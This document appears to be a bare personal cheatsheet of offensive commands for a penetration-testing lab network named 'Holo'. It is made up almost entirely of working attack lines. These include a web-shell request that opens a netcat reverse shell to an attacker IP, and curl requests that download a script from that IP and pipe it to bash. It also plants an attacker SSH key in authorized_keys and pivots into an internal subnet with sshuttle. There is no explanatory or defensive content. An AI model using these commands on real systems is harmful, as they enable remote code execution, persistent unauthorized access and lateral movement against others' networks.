# Holo Cheatsheet

http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.107.22+4444



curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.22%3A80%2Fshellscript.sh%7Cbash%20%26'


curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.22%3A80%2Fshellscript.sh%7Cbash%20%26'

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYM/RBce4CV+LpO9ixetmQVgtafM+N13lqlpVOz82p4Uzq1qj9J7WJynd2do0Jm4BY9ZxefMRsFEyNwdbSG1+R7jpsxWxUt/y0sACT45ohlESxrtT/U0WynYoWzxGyExO0SVNE58aYII81i5SIPKtjzSkeqMEZeMmJkUCdZANlswDiIfmMCcA15L3rTfxfpO9kPUrE9k5fbBT+MG5+Qe5mZuyjt48mfW+BPs2p/4kSnq4yF3qyjM9TB1xaDCmfYgyQTxNcCuDCKtV+2jug2QKX0RmQFH6xURCtKYjxZ1XhLpDeFwD5MfhXd2ATbC4s1EXZWqcPdMsVByzGKXLMbJRAr2RqCPjDWI3ub4KusV6u718L01THXph6jjUoAhJe3ojfwuBYt2BD56eugpTpaOhLd+FIExLlhXWe0zoK91Eyn2BdAxXQ2Rn+q70d6qwx+TFQcuiHukBAuYPktDdVG4iTFpCsdXvqaeLM0Z0U2O/Ga2l4hGXVya/rzuQScnAHEyE= kali@kali
" > authorized_keys





sshuttle -r root@admin.holo.live --ssh-cmd "ssh -i /home/kali/.ssh/id_rsa" 10.200.110.0/24 -x 10.200.110.33

